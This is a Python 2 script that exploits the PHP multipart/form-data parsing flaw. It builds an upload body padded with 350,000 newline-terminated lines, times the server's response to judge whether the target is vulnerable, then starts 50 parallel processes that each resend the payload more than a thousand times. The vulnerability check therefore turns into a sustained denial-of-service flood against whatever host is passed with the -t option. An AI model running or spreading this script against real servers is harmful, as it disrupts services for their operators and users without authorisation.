#!/usr/bin/env python

import urllib2
import datetime
from optparse import OptionParser
import multiprocessing


def check_php_multipartform_dos(url, post_body, headers):
    req = urllib2.Request(url)
    for key in headers.keys():
        req.add_header(key, headers[key])
    start_time = datetime.datetime.now()
    fd = urllib2.urlopen(req, post_body)
    print fd.getcode()
    end_time = datetime.datetime.now()
    use_time = (end_time - start_time).seconds
    result = ''
    if use_time > 5:
        result = url + " is vulnerable"
    else:
        if use_time > 3:
            result = "need to check normal respond time"
    return [result, use_time]


# end

# worker function
def worker():
    x = 0
    while True:
        if x > 1000:
            exit(0)
        print x
        attack()
        x += 1


def attack():
    parser = OptionParser()
    parser.add_option("-t", "--target", action="store",
                      dest="target",
                      default=False,
                      type="string",
                      help="test target")
    (options, args) = parser.parse_args()
    if options.target:
        target = options.target
    else:
        return

    count = 350000
    headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
               'Accept-Encoding': 'gzip, deflate',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'}
    body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=sp.jpg"
    payload = ""
    for x in range(count):
        payload += "a\n"
    body += payload
    body += "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
    print "starting..."
    respond = check_php_multipartform_dos(target, body, headers)
    print "Result : "
    print respond[0]
    print "Respond time : " + str(respond[1]) + " seconds"


if __name__ == "__main__":
    jobs = []
    for i in range(50):
        p = multiprocessing.Process(target=worker)
        jobs.append(p)
        p.start()
